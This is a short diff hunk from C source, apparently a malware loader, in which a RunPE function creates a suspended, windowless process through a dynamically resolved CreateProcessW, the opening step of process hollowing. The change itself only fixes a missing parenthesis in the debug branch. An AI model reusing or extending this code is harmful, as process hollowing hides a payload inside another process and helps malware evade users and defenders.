@@ -78,7 +78,7 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 #ifndef DEBUG
 	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
 #else
-	if pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
 #endif
 	{
 		//pid = pGetProcessId(PI.hProcess); 
